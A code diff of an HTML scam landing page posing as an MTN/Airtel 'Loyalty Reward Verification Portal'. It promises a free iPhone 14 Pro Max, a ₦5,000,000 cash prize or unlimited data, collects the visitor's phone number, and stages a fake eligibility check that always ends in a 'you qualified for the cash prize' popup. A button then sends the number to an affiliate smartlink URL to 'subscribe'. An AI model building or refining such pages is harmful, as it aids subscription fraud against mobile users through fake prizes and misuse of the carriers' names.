@@ -2,54 +2,66 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Loyalty Reward Program</title>
+  <title>Loyalty Reward Verification Portal</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f9f9f9;
+      background: #111;
+      color: #eee;
       margin: 0;
       padding: 0;
-      color: #333;
     }
     .container {
-      max-width: 400px;
-      margin: 50px auto;
-      background: #fff;
+      max-width: 500px;
+      margin: 40px auto;
+      background: #1b1b1b;
       padding: 30px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      border-radius: 8px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(255,0,0,0.2);
     }
     .header {
       text-align: center;
     }
     .header h1 {
-      font-size: 22px;
-      color: #f7b500;
+      color: #ff4444;
+      margin-bottom: 10px;
     }
-    .subtext {
-      font-size: 15px;
-      margin-top: 10px;
-      text-align: center;
+    .header p {
+      font-size: 14px;
+      line-height: 1.5;
+      color: #ccc;
     }
-    .input-group {
-      margin-top: 30px;
+    .image-row {
+      display: flex;
+      justify-content: space-between;
+      margin: 25px 0;
+    }
+    .image-row img {
+      width: 32%;
+      border-radius: 8px;
+      border: 2px solid #333;
+    }
+    .form-group {
+      margin-top: 20px;
     }
     input[type="tel"] {
       width: 100%;
       padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
       font-size: 16px;
+      border: 1px solid #444;
+      border-radius: 5px;
+      background: #222;
+      color: #fff;
     }
     button {
-      margin-top: 20px;
+      margin-top: 15px;
       width: 100%;
       padding: 12px;
-      background: #f7b500;
+      background: #ff4444;
       border: none;
       color: white;
       font-size: 16px;
-      border-radius: 4px;
+      border-radius: 5px;
       cursor: pointer;
     }
     .loading-screen, .popup {
@@ -59,7 +71,7 @@
       left: 0;
       right: 0;
       bottom: 0;
-      background: rgba(0, 0, 0, 0.9);
+      background: rgba(0, 0, 0, 0.95);
       color: #fff;
       z-index: 999;
       justify-content: center;
@@ -72,27 +84,44 @@
       margin-top: 20px;
       background: #25d366;
     }
+    .footer {
+      font-size: 12px;
+      color: #666;
+      margin-top: 20px;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="header">
-      <h1>MTN Loyalty Reward Program</h1>
-      <div class="subtext">
-        You may be eligible to win a free iPhone 14 Pro Max. Enter your number below to check eligibility.
-      </div>
-    </div>
-    <div class="input-group">
-      <input type="tel" id="msisdn" placeholder="Enter your MTN or Airtel number" />
-      <button onclick="startCheck()">Check Eligibility</button>
-    </div>
+      <h1>Loyalty Reward Verification Portal</h1>
+      <p>
+        As part of our 2025 Customer Loyalty Program, selected users may be eligible to receive a <strong>free iPhone 14 Pro Max</strong>, <strong>₦5,000,000 cash prize</strong>, or <strong>unlimited data bundle</strong>.<br><br>
+        To determine your eligibility, kindly provide your <strong>active MTN or Airtel number</strong> below.
+      </p>
+    </div><div class="image-row">
+  <img src="https://via.placeholder.com/120x120?text=iPhone" alt="iPhone" />
+  <img src="https://via.placeholder.com/120x120?text=Cash+Prize" alt="Cash" />
+  <img src="https://via.placeholder.com/120x120?text=Unlimited+Data" alt="Data" />
+</div>
+
+<div class="form-group">
+  <input type="tel" id="msisdn" placeholder="Enter your MTN or Airtel number" />
+  <button onclick="startCheck()">Check Eligibility</button>
+</div>
+
+<div class="footer">
+  Only MTN and Airtel users are eligible. Terms & Conditions apply.
+</div>
+
   </div>  <div class="loading-screen" id="loading">
     <h2>Checking your eligibility...</h2>
   </div>  <div class="popup" id="result">
     <h2>Sorry 😢</h2>
-    <p>You did not qualify for the iPhone giveaway.<br>
-    But you have qualified for our ₦5,000,000 cash prize reward 🎉</p>
-    <button onclick="redirectToOffer()">Enter your number to subscribe and claim</button>
+    <p>You did not qualify for the iPhone.<br>
+    But you have qualified for our <strong>₦5,000,000 cash prize</strong> 🎉</p>
+    <button onclick="redirectToOffer()">Enter your number to subscribe & claim</button>
   </div>  <script>
     function startCheck() {
       const number = document.getElementById('msisdn').value;
@@ -109,7 +138,6 @@
 
     function redirectToOffer() {
       const number = document.getElementById('msisdn').value;
-      // Smartlink will detect MTN or Airtel automatically
       window.location.href = `https://your-smartlink.com/?msisdn=${number}`;
     }
   </script></body>
